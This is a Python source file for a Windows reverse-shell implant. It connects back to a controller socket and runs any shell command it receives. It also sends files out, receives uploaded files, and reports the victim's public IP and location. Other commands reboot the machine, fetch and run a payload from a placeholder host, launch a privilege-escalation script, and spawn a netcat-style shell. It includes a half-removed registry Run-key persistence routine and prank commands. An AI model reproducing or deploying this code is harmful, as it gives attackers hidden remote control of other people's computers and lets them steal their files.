import socket
import subprocess
import os
import winreg as reg
import time
import webbrowser
import urllib.request
import json

# def AddToStartup(f_name, path): 

#     address=os.path.join(path, f_name)  
#     key = reg.HKEY_CURRENT_USER 
#     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#     open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
#     reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
#     reg.CloseKey(open)


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try Until Not Connected
    connected = False
    while (connected == False):
        try:
            
            s.connect(('127.0.0.1', 9001))

            connected = True

            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            
        except:

            print(".", end="")

    while True:
        try:

            command = s.recv(2048).strip().decode('utf-8')

            if 'terminate' in command:
                s.close()
                break

            elif 'trollsploit.fbi_openup' in command:
                url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                webbrowser.get().open(url)

            elif 'sysctl.restart' in command:
                try:
                    os.system('shutdown /r')
                except:
                    'null'

            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'


            elif 'migrate' in command:
                try:
                    os.system('powershell cp ~/Desktop/hehe.exe C:/temp/')
                    s.close()
                    os.system('powershell C:/temp/hehe.exe -e cmd.exe')
                except:
                    return 'null'


            elif 'data.ip' in command:
                try:
                    csocket = s.accept()
                    public_ip = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    csocket.send(public_ip.encode('utf-8'))
                except:
                    return 'null'

            elif 'systemctl.eject' in command:
                try:
                    os.system('powershell (New-Object -com "WMPlayer.OCX.7").cdromcollection.item(0).eject()')
                except:
                    'null'

            elif 'trollsploit.orange' in command:
                try:
                    os.system('powershell curl https://YOURWEBSITE.io/orange.exe -o orange.exe')
                    os.system('powershell mv orange C:/temp/')
                    os.system('powershell C:/temp/orange.exe')
                except:
                    'null'

            elif 'data.location' in command:
                try:
                    data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf-8')
                    json_data = json.loads(data)
                    country_name = json_data['country_name']
                    city = json_data['city']
                    message = f'[+] Current Location: {country_name}, {city}'
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'trollsploit.fbi_openup' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                    webbrowser.get().open(url)
                except:
                    'null'
            
            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'

            elif 'priv.exec' in command:
                try:
                    s.close()
                    os.system('powershell C:/temp/privesc.ps1')
                except:
                    'null'

            elif command.startswith('grab'):

                file_name = command[5:]

                file_size = os.path.getsize(file_name)

                s.send(file_name.encode('utf-8'))

                s.recv(1024).decode('utf-8')


                s.send(str(file_size).encode('utf-8'))

                s.recv(1024).decode('utf-8')
                with open(file_name, "rb") as file:

                    c = 0
                    start_time = time.time()
                    while c < file_size:
                        data = file.read(1024)
                        if not (data):
                            break
                        s.sendall(data)
                        c += len(data)

                    end_time = time.time()
            elif 'transfer' in command:
                file_name = s.recv(1024).decode('utf-8')
                s.send('OK'.encode('utf-8'))
                file_size = s.recv(1024).decode('utf-8')
                s.send('OK'.encode('utf-8'))
                with open(file_name, "wb") as file:

                    c = 0
                    
                    start_time = time.time()

                    while c < int(file_size):

                        data = s.recv(1024)

                        if not (data):
                            break

                        file.write(data)

                        c += len(data)
                    end_time = time.time()
            elif command.startswith('cd '):

                dir = command[3:]
                try:
                    os.chdir(dir)

                except:
                    os.chdir(cwd)
                cwd = os.getcwd()
                
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            elif command.startswith('startup'):

                file_name = command[8:]

                pth = os.getcwd()

                try:
                    AddToStartup(file_name, pth)
                    s.send("OK".encode('utf-8'))

                except Exception as e:
                    s.send(str(e).encode('utf-8'))

            else:
                # Executing Command
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out = CMD.stdout.read()
                err = CMD.stderr.read()
                s.send(out)
                s.send(err)
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))
                    
        except Exception as e:
            s.send(str(e).encode('utf-8'))


connected = False
while (not connected):
    try:
        connect()
        connected = True
    except:
        print(".", end = "")